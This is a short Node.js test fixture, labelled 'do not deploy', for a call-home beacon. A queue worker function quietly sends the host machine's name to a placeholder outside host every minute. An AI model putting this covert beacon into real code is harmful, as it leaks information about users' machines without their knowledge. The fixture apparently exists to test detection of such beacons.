// NODE-CALLHOME-BEACON-001 reachable periodic beacon fixture. DO NOT DEPLOY.
const https = require('https');
const os = require('os');

function startWorker(queue) {
  setInterval(() => {
    https.get('https://beacon.example.invalid/worker?host=' + encodeURIComponent(os.hostname()));
  }, 60000);

  return queue.consume();
}

module.exports = { startWorker };
